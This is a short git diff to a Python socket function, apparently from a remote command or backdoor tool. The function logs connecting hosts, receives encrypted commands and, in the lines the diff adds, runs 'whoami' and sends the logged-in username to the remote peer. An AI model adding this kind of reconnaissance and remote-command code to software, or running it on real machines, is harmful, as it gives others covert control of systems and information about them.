@@ -115,6 +115,10 @@ def conexao(meuIP):
                 arq=open('conectados.txt','w') # cria arquivo
             arq.write(str(endereco[0])+' - '+str(hora)+'\n') # escreve no arquivo dos hosts conectados
 
+            #envia o nome de usuario que a pessoa esta logada
+            a = subprocess.check_output('whoami', shell=True)
+            conexao.send(a)
+
             # recebe dados enviados pelo cliente
             while True:
                 # CRIA AS LISTAS QUE VÃO GUARDAR
@@ -155,7 +159,7 @@ def conexao(meuIP):
                     conexao.send('exit')
                     conexao.close()
                     exit()
-                    
+
                 if(tam==1):
                     comando = novo_descriptografado[0]
 
